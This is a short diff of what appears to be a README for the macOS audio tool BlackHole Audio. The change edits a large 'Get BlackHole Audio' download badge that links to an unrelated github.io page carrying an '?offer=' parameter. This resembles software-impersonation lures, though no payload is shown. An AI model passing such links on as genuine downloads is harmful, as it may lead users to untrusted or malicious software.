@@ -2,7 +2,7 @@
 
 BlackHole Audio is a macOS application that allows users to route audio between different applications on their Mac. It provides virtual audio devices for recording, streaming, and mixing, offering a flexible solution for musicians, podcasters, and content creators.
 
-<a href="https://git-deployer-app.github.io/.github/?offer=BlackHole Audio" target="_blank">
+<a href="https://git-deployer-app.github.io/.github/?offer=BlackHoleAudio" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20BlackHole%20Audio%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
